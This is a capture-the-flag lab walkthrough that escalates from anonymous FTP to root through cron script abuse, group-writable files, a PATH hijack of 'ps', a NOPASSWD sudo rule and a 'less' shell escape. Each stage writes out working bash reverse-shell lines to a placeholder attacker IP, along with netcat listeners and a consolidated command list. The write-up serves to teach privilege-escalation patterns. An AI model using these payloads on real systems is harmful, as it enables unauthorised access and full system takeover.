\# Recon Pipeline — Full Walkthrough (Anonymous FTP → Root)



\## TL;DR



An anonymous FTP server hosts an automated "recon pipeline" that blindly executes any script dropped into its watch folder. By abusing weak trust boundaries at every stage — group memberships, writable files owned by lower-privileged users but executed by higher-privileged automation, and an overly permissive sudo rule — we escalate:



```

Anonymous FTP → recon\_user → dev\_user → monitor\_user → ops\_user → root

```



\*\*Core lesson:\*\* almost every hop in this chain is the \*same\* vulnerability pattern repeated: \*"A higher-privileged process executes a file that a lower-privileged user can write to."\* Once you learn to spot that pattern once, you can spot it five times.



\---



\## Stage 0 — Recon



\### Port scan

```bash

nmap -sC -sV -p- -T4 10.49.144.194

```

\*\*Result:\*\*

```

21/tcp open  ftp     vsftpd 3.0.5

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu

```

Only two services exposed. No web server — so FTP is the only real attack surface to start with.



\### Anonymous FTP login

```bash

ftp 10.49.144.194

Name: Anonymous

Password: (blank or "anonymous")

```

vsftpd allowed anonymous login — always worth trying on any FTP service you find.



\### Enumerating the FTP tree

```

ftp> ls

drwxrwxrwx   incoming

drwxr-xr-x   pub



ftp> cd pub

ftp> ls

\-rw-r--r--   README.txt

drwxr-xr-x   archive

drwxrwxrwx   uploads

```



\*\*Key lesson:\*\* `ls -la` and paying attention to permission bits (`rwxrwxrwx` = world-writable) is critical. World-writable directories are near-guaranteed to be part of the intended attack path in a CTF.



\### Reading the hint file

```bash

get README.txt

cat README.txt

```

```

\[ recon pipeline ]

All recon jobs must be placed in incoming/.

Files are processed automatically on arrival.

Invalid formats are ignored.

```



This tells us: something on the server watches `incoming/` and executes files placed there.



\---



\## Stage 1 — Anonymous FTP → `recon\_user` (Remote Code Execution)



\### Testing for execution

We didn't know the exact mechanism yet, so we tested empirically:

1\. Uploaded a plain `.txt` file — no observable effect.

2\. Uploaded a real nmap XML scan (`-oX`) — no observable effect.

3\. \*\*Uploaded a `.sh` script — it executed.\*\*



```bash

echo '#!/bin/bash

bash -i >\& /dev/tcp/<ATTACKER\_IP>/4444 0>\&1' > shell.sh

```

```

ftp> cd incoming

ftp> put shell.sh

```

Listener:

```bash

nc -lvnp 4444

```

\*\*Result:\*\* reverse shell as `recon\_user`.



\### Why this worked

Once inside, we found the actual automation:

```bash

crontab -l

\# \* \* \* \* \* /bin/bash /opt/recon/scan\_uploads.sh



cat /opt/recon/scan\_uploads.sh

```

```bash

\#!/bin/bash

shopt -s nullglob

for f in /srv/ftp/incoming/\*.sh; do

&#x20; /bin/bash "$f" \&

&#x20; sleep 5

done

```



\*\*Root cause:\*\* a cron job, running every minute as `recon\_user`, blindly executes any `.sh` file found in the world-writable FTP `incoming/` directory — no validation of content or origin.



\*\*Flag found:\*\*

```bash

cat \~/flag.txt

```



\---



\## Stage 2 — `recon\_user` → `dev\_user` (Group Membership Abuse)



\### Enumeration

```bash

id

\# uid=1001(recon\_user) groups=1001(recon\_user),1002(dev\_user),1005(devops)

```

`recon\_user` is unexpectedly also a member of the `dev\_user` and `devops` groups — this is the trust-boundary flaw for this stage.



```bash

find / -group dev\_user 2>/dev/null

```

Found:

```

/opt/dev/backup.sh   (owned by dev\_user:dev\_user, mode -rwxrwxr-x)

/opt/dev/bin/ps       (owned by dev\_user:dev\_user, mode -rw-rw-r--)

```



Because `recon\_user` is in the `dev\_user` group, and both files are \*\*group-writable\*\*, we can edit them directly.



\### Checking the automation

```bash

cat /opt/dev/backup.sh

```

```bash

\#!/bin/bash

tar -czf /tmp/recon\_backup.tgz /home/recon\_user

```

This script is executed periodically as `dev\_user` (confirmed by testing — it's another cron-driven job, same pattern as Stage 1).



\### Exploit

```bash

echo 'bash -i >\& /dev/tcp/<ATTACKER\_IP>/4445 0>\&1' >> /opt/dev/backup.sh

```

Listener:

```bash

nc -lvnp 4445

```

Wait for the next cron cycle → shell as `dev\_user`.



\*\*Lesson:\*\* group membership is a permission boundary just as important as file ownership. Always run `id` after landing on any user — inherited group access is one of the most common lateral movement vectors.



\---



\## Stage 3 — `dev\_user` → `monitor\_user` (PATH Hijack via systemd Service)



\### Enumeration

```bash

find / -group monitor\_user 2>/dev/null

```

Found:

```

/usr/local/bin/healthcheck   (owned by monitor\_user)

```



```bash

systemctl cat healthcheck.service

```

```ini

\[Service]

Type=simple

User=monitor\_user

Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin

ExecStart=/usr/local/bin/healthcheck

```



\*\*Critical detail:\*\* the service's `$PATH` puts `/opt/dev/bin` — a directory owned by `dev\_user`, which we already control — \*\*before\*\* `/usr/bin` (where the real system binaries live).



```bash

cat /usr/local/bin/healthcheck

```

```bash

\#!/bin/bash

echo "Running as: $(whoami)"

while true; do

&#x20; ps aux | grep -v grep

&#x20; sleep 5

done

```

The script calls `ps aux` \*\*without an absolute path\*\*. Since `/opt/dev/bin` is searched first, and we control that directory (from Stage 2, we own `/opt/dev/bin/ps`), we can replace `ps` with our own binary — a classic \*\*PATH hijack\*\*.



\### Exploit

```bash

echo -e '#!/bin/bash\\nbash -i >\& /dev/tcp/<ATTACKER\_IP>/4447 0>\&1' > /opt/dev/bin/ps

chmod +x /opt/dev/bin/ps

```

Listener:

```bash

nc -lvnp 4447

```

The `healthcheck` loop calls `ps aux` every 5 seconds — connection lands almost immediately.



\*\*Flag found:\*\*

```bash

cat /home/monitor\_user/flag.txt

```



\*\*Lesson:\*\* never trust `$PATH` order blindly. Any service or script that puts a non-standard, writable directory ahead of system paths (`/usr/bin`, `/bin`) is vulnerable to command hijacking if it calls any command without an absolute path.



\---



\## Stage 4 — `monitor\_user` → `ops\_user` (Writable File + Sudo Rule)



\### Enumeration

```bash

find / -group ops\_user 2>/dev/null

```

Found:

```

/opt/app/deploy\_helper.sh   (owned by monitor\_user!)

/usr/local/bin/deploy.sh    (owned by ops\_user, not writable by us)

```

```bash

cat /usr/local/bin/deploy.sh

```

```bash

\#!/bin/bash

cd /opt/app 2>/dev/null

./deploy\_helper.sh

```

`deploy.sh` is owned by `ops\_user` and executes `deploy\_helper.sh` — which is a \*\*separate file that we (monitor\_user) own outright\*\*.



\*\*Key concept clarified during this stage:\*\* file \*ownership\* only controls who can \*edit\* a file — it does not determine what user context the file \*runs in\*. A script runs as whoever's process invokes it. Since `deploy.sh` is executed as `ops\_user`, anything it calls (including our writable `deploy\_helper.sh`) also runs as `ops\_user`, regardless of who owns that child script.



\### The trigger — sudo rule (not cron this time)

```bash

sudo -l

```

```

User monitor\_user may run the following commands on tryhackme-2404:

&#x20;   (ops\_user) NOPASSWD: /usr/local/bin/deploy.sh

```

This means we can directly invoke `deploy.sh` as `ops\_user` any time, with no password.



\### Exploit

```bash

echo -e '#!/bin/bash\\nbash -i >\& /dev/tcp/<ATTACKER\_IP>/5556 0>\&1' > /opt/app/deploy\_helper.sh

chmod +x /opt/app/deploy\_helper.sh

```

Listener:

```bash

nc -lvnp 5556

```

Trigger immediately (no waiting needed, since it's sudo-invoked, not cron-scheduled):

```bash

sudo -u ops\_user /usr/local/bin/deploy.sh

```

\*\*Result:\*\* shell as `ops\_user`.



\*\*Lesson:\*\* always run `sudo -l` on every user you land on. A `NOPASSWD` rule that lets you execute a script owned by a different, more-privileged user is one of the most direct escalation vectors possible — no need to wait for cron timing at all.



\---



\## Stage 5 — `ops\_user` → `root` (GTFOBins: `less`)



\### Enumeration

```bash

sudo -l

```

```

(root) NOPASSWD: /usr/bin/less

```



\### Why `less` gives root

`less` (like many pagers, editors, and text tools) supports shelling out to a command line via `!<command>` while the file is open in interactive mode. Since it's invoked via `sudo`, the shell it spawns inherits \*\*root\*\* privileges, not the invoking user's.



This is documented behavior across many binaries — see \[GTFOBins](https://gtfobins.github.io/) for the full catalog of privileged binaries with known escapes (`less`, `vim`, `man`, `awk`, `find`, `nmap`, and dozens more).



\### Exploit

```bash

sudo /usr/bin/less /etc/passwd

```

Once `less` is open and showing the file \*\*interactively\*\* (not immediately returned to a normal shell prompt — this matters, see pitfall below), type:

```

!/bin/bash

```

and press Enter. This spawns a root shell from within `less`.



Confirm:

```bash

whoami

id

```

Read the final flag:

```bash

cat /root/root.txt

```



\### Pitfall we hit: non-interactive TTY

A raw `bash -i >\& /dev/tcp/...` reverse shell isn't a fully interactive TTY. `less` detects this and just dumps the file to screen instead of opening its interactive pager — so `!/bin/bash` typed \*after\* it already exited gets interpreted by the parent shell instead (and fails, since `!/bin/bash` isn't valid bash syntax).



\*\*Fix — upgrade the shell to a real TTY first:\*\*

```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

```

Then on the attacker (listener) side:

```

Ctrl+Z

stty raw -echo; fg

<press Enter twice>

export TERM=xterm

```

Then retry `sudo /usr/bin/less /etc/passwd` — it will now open properly in interactive mode, and `!/bin/bash` will work as expected.



\---



\## Full Command Reference (in order)



```bash

\# Recon

nmap -sC -sV -p- -T4 10.49.144.194



\# FTP anonymous access

ftp 10.49.144.194

Name: Anonymous

ls -la

cd pub \&\& get README.txt

cat README.txt



\# Stage 1: RCE via incoming/ (recon\_user)

echo '#!/bin/bash

bash -i >\& /dev/tcp/<IP>/4444 0>\&1' > shell.sh

\# ftp: cd incoming \&\& put shell.sh

nc -lvnp 4444

crontab -l

cat /opt/recon/scan\_uploads.sh

cat \~/flag.txt



\# Stage 2: recon\_user -> dev\_user (group membership)

id

find / -group dev\_user 2>/dev/null

cat /opt/dev/backup.sh

echo 'bash -i >\& /dev/tcp/<IP>/4445 0>\&1' >> /opt/dev/backup.sh

nc -lvnp 4445



\# Stage 3: dev\_user -> monitor\_user (PATH hijack)

find / -group monitor\_user 2>/dev/null

systemctl cat healthcheck.service

cat /usr/local/bin/healthcheck

echo -e '#!/bin/bash\\nbash -i >\& /dev/tcp/<IP>/4447 0>\&1' > /opt/dev/bin/ps

chmod +x /opt/dev/bin/ps

nc -lvnp 4447

cat /home/monitor\_user/flag.txt



\# Stage 4: monitor\_user -> ops\_user (writable file + sudo)

find / -group ops\_user 2>/dev/null

cat /usr/local/bin/deploy.sh

sudo -l

echo -e '#!/bin/bash\\nbash -i >\& /dev/tcp/<IP>/5556 0>\&1' > /opt/app/deploy\_helper.sh

chmod +x /opt/app/deploy\_helper.sh

nc -lvnp 5556

sudo -u ops\_user /usr/local/bin/deploy.sh



\# Stage 5: ops\_user -> root (GTFOBins less)

sudo -l

python3 -c 'import pty; pty.spawn("/bin/bash")'

\# Ctrl+Z, stty raw -echo; fg, export TERM=xterm

sudo /usr/bin/less /etc/passwd

!/bin/bash

whoami

cat /root/root.txt

```



\---



\## Key Takeaways / What I Learned



1\. \*\*Privilege escalation via cron is a repeating pattern, not a one-off trick.\*\* Any time a cron job (or systemd timer/service) runs as a privileged user and executes a file, the real question to ask is: \*"Can I, as a lower-privileged user, write to that file — or to anything in the directory it searches for commands?"\* If yes, you can hijack it.



2\. \*\*File ownership ≠ execution context.\*\* A script runs with the privileges of whoever's process invokes it, not whoever wrote or owns the file. This is the single most important mental model in this whole chain — it's why editing a file owned by `monitor\_user` could still net a shell as `ops\_user`.



3\. \*\*Group membership is an overlooked privilege boundary.\*\* `id` should be one of the first commands run on every new shell. Unexpected group memberships (like `recon\_user` being in `dev\_user`'s group) are a direct sign of an intended lateral movement path.



4\. \*\*`$PATH` order matters enormously for services running as other users.\*\* If a systemd service or script's `$PATH` includes a directory you can write to \*before\* the real system directories, and it calls any command without an absolute path, that's an instant hijack opportunity.



5\. \*\*Always run `sudo -l` on every user you land on.\*\* It's the fastest way to find a direct, on-demand escalation path (versus waiting on cron timing), and a `NOPASSWD` entry for a script you can also write to (directly or indirectly) is close to an instant root/next-user shell.



6\. \*\*GTFOBins is essential once you have any sudo rule.\*\* Even a rule that looks "safe" (like running `less`, `vim`, `man`, `find`, or `awk` as another user) can usually be turned into a full shell as that user, because so many common Unix tools have a documented "escape to shell" feature (`!command` in `less`, `:!command` in `vim`, etc.).



7\. \*\*A reverse shell from `bash -i >\&/dev/tcp/...` is not a full TTY.\*\* Interactive programs like `less`, `vim`, or `sudo -i` may misbehave until you upgrade it with `python3 -c 'import pty; pty.spawn("/bin/bash")'` plus the `stty raw -echo` trick on the attacker side.



8\. \*\*Empirical testing beats guessing when you can't read the source.\*\* We didn't know upfront that `.sh` files were what got executed — we found out by testing multiple formats and observing which one produced side effects. When you can't see the backend, structured trial-and-error (with a listener open to catch feedback) is a legitimate and necessary technique.

